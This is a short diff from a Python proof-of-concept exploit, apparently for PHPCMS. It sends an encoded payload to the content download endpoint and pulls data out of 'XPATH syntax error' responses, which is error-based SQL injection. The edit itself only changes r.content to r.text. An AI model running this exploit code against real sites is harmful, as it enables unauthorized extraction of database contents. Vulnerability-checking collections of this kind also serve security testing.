@@ -57,6 +57,6 @@ def __poc(url):
 
     setp3 = url + '/index.php?m=content&c=down&a_k=' + enc_payload
     r = requests.get(setp3, cookies=cookies, timeout=TIMEOUT)
-    result = re.findall('XPATH syntax error: \'(.*?)\'', r.content)
+    result = re.findall('XPATH syntax error: \'(.*?)\'', r.text)
     if result[0]:
         return "{} - {}".format(url, result[0])
